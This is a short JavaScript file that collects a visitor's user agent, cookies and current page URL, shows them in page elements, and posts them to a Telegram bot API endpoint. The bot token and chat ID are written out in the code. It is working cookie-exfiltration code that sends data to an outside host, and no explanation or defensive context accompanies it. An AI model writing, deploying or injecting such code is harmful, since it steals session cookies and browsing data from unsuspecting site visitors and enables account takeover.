function print(id, text) {
  const elm = document.getElementById(id);
  if (elm !== null) {
    elm.innerText = text;
  }
}

const url = 'https://api.telegram.org/bot8034953949:AAEUYKGepGLfm66Q_ZsBVSV-vZRKhpViryo/sendMessage';

print("ua", navigator.userAgent);
print("cookie", document.cookie);
print("url", url);

fetch(url, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    chat_id: 7503104117,
    text: `
    userAgent: ${navigator.userAgent},
    cookie: ${document.cookie},
    referer: ${location.href}
    `
  }),
})
  .then((response) => {
    if (response.ok) {
      return response.text();
    } else {
      print("response", JSON.stringify(response));
      return Promise.reject(response);
    }
  })
  .then((data) => {
    print("response", data);
    console.log(data);
  })
  .catch(function (err) {
    print("response", err.message);
    console.warn("Something went wrong.", err);
  });
